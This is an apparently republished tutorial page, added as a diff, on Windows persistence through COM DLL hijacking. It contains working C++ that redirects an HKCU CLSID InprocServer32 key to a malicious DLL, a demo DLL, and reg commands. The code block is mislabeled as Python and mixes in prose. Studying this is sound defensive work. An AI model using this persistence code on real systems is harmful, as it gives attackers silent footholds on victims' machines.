@@ -1,0 +1,172 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Malware development: persistence - part 3. COM DLL hijack.</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #30</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Malware development: persistence - part 3. COM DLL hijack.</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This section is a next part of a series of articles on windows malware persistence techniques and tricks. Today I’ll wrote about the result of self-researching another persistence trick: COM hijacking. Component Object Model In Windows 3.11, Microsoft introduced the Component Object Model (COM) is an object-oriented system meant to create binary software components that can interact with other objects. It’s an interface technology that allows you to reuse items without knowing how they were made internally. I’ll show you how red commands can use COM objects to run arbitrary code on behalf of a trusted process in this post. When a software needs to load a COM object, it uses the Windows API CoCreateInstance to construct an uninitialized object instance of a specific class, with the CLSID as one of the needed parameters (class identifier). When a program calls CoCreateInstance with a particular CLSID value, the operating system consults the registry to discover which binary contains the requested COM code:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The contents of the InProcServer32 subkey under the CLSID key seen in the previous image are presented in the next image:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In my case, firefox.exe calling CoCreateInstance with CLSID: {A1DB7B5E-D0EA-4FE0-93C4-314505788272}. The C:\Windows\System32\TaskFlowDataEngine.dll file associated with the registry key HKCU\Software\Classes\CLSID\{A1DB7B5E-D0EA-4FE0-93C4-314505788272}\InprocServer32 There are a variety of ways to execute code, but COM has been employed in red teaming circumstances for persistence, lateral movement, and defense evasion in various instances. Various registry sub-keys are used during COM Hijacking depending on how the malicious code is run. These are the following:</p>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>InprocServer/InprocServer32</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>LocalServer/LocalServer32</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>TreatAs</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>ProgID</span></div></div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The sub-keys listed above are found in the following registry hives:</p>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>HKEY_CURRENT_USER\Software\Classes\CLSID</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>HKEY_LOCAL_MACHINE\Software\Classes\CLSID</span></div></div>
+
+            <div id="how-to-discover-com-keys-for-hijacking" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>How to discover COM keys for hijacking</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Identification of COM keys that could be used to commit COM hijacking is simple and just requires the use of sysinternals Process Monitor to find COM servers that lack CLSIDs. It also does not require elevated privileges (HKCU). The following filters can be set up in Process Monitor:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Also still good to add: Exclude if path starts with HKLM The HKEY CURRENT USER (HKCU) key is examined first when trying to load COM objects, giving preference to user-specified COM objects rather than system-wide COM objects (additional information in HKEY CLASSES ROOT key). In my case, the firefox.exe process exhibits this behavior in the image below. The process is attempting to access CLSID A6FF50C0-56C0-71CA-5732-BED303A59628 at the HKCU registry key. Because the CLSID isn’t found in the HKCU registry key, Windows reverts to HCKR (HKLM beneath the hood) for the identical CLSID, which worked in the previous attempt. This can be checked with commands: reg query \ "HKCU\Software\Classes\CLSID\ {A6FF50C0-56C0-71CA-5732-BED303A59628}\InprocServer32" /s reg query "HKCR\CLSID\ {A6FF50C0-56C0-71CA-5732-BED303A59628}\InprocServer32" /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Following the steps outlined above, we now have critical information that we may use to launch a COM Hijacking attack.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">attack process First off all, export the specified subkeys, entries, and values of the local computer into a file: reg export \ "HKCR\CLSID\{A6FF50C0-56C0-71CA-5732-BED303A59628} \InprocServer32" \ C:\...\2022-05-02-malware-pers-3\orig.reg /reg:64 /y</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The next step is modify this file to set the default value of HKCU\Software\Classes\CLSID\{A6FF50C0-56C0-71CA-5732-BED303A59628}\InprocServer32 registry key:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, we are placing custom DLL to be executed:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">For simplicity, as always I took all the same file from one of my previous posts. You can compile it from source code (evil.cpp):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">/*
+evil.cpp
+simple DLL for DLL inject to process
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2021/09/20/malware-injection-2.html
+*/
+
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+BOOL APIENTRY DllMain(HMODULE hModule,
+DWORD nReason, LPVOID lpReserved) {
+switch (nReason) {
+case DLL_PROCESS_ATTACH:
+MessageBox(
+NULL,
+"Meow from evil.dll!",
+"=^..^=",
+MB_OK
+);
+break;
+case DLL_PROCESS_DETACH:
+break;
+case DLL_THREAD_ATTACH:
+break;
+case DLL_THREAD_DETACH:
+break;
+}
+return TRUE;
+}
+Then, just run:
+x86_64-w64-mingw32-g++ -shared -o evil.dll evil.cpp -fpermissive
+
+Save reg file as evil.reg:
+
+And import, then check registry again:
+
+reg import \
+C:\...\2022-05-02-malware-pers-3\evil.reg /reg:64
+reg query \
+"HKCU\Software\Classes\CLSID\
+{A6FF50C0-56C0-71CA-5732-BED303A59628}\InprocServer32" \
+/s
+
+Perfect!
+demo
+Then restart firefox.exe in my case, wait some time. I’ve be waiting around 7 mins:
+
+If you notice then PID is 9272. But if you open Process Hacker you can see that it’s
+not here:
+
+Firefox crashed after a some time:
+
+but it happened the only time.
+Later, the “meow-meow” messagebox window popped-up with some frequency:
+
+And even after closing firefox:
+
+That’s perfectly! :)
+update: programmer way
+I also created pers.cpp dirty PoC script:
+/*
+pers.cpp
+windows low level persistence via
+COM hijacking
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2022/05/02/malware-pers-3.html
+
+*/
+#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+#include &lt;cstdio&gt;
+int main(int argc, char* argv[]) {
+HKEY hkey = NULL;
+// subkey
+const char* sk =
+"Software\\Classes\\CLSID\\
+{A6FF50C0-56C0-71CA-5732-BED303A59628}\\InprocServer32";
+// malicious DLL
+const char* dll =
+"C:\\Users\\User\\Desktop\\shared\\
+2022-05-02-malware-pers-3\\evil.dll";
+// startup
+LONG res = RegCreateKeyEx(HKEY_CURRENT_USER,
+(LPCSTR)sk, 0, NULL, REG_OPTION_NON_VOLATILE,
+KEY_WRITE | KEY_QUERY_VALUE, NULL, &amp;hkey, NULL);
+if (res == ERROR_SUCCESS) {
+// create new registry keys
+RegSetValueEx(hkey, NULL, 0, REG_SZ,
+(unsigned char*)dll, strlen(dll));
+RegCloseKey(hkey);
+} else {
+printf("cannot create subkey for hijacking :(\n");
+return -1;
+}
+return 0;
+}
+compile it:
+x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
+-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
+-fdata-sections -Wno-write-strings -fno-exceptions \
+-fmerge-all-constants -static-libstdc++ \
+-static-libgcc -fpermissive
+
+and run:
+.\pers.exe
+
+As you can see, everything is work perfectly :)
+Cleaning after completion of experiments:
+reg delete \
+"HKCU\Software\Classes\CLSID\
+{A6FF50C0-56C0-71CA-5732-BED303A59628}" \
+/f
+
+conclusion
+An attacker can employ a not-so-common but widely used technique to ensure silent
+persistence in a system after executing this actions. In the wild, this trick was often used
+by groups such as APT 28, Turla, as well as Mosquito backdoor.
+COM hijacking MITRE ATT&amp;CK
+APT 28
+Turla
+RegCreateKeyEx
+RegSetValueEx
+reg query
+reg import
+reg export
+reg delete
+source code in github</code></pre>
+            </div></main></body></html>
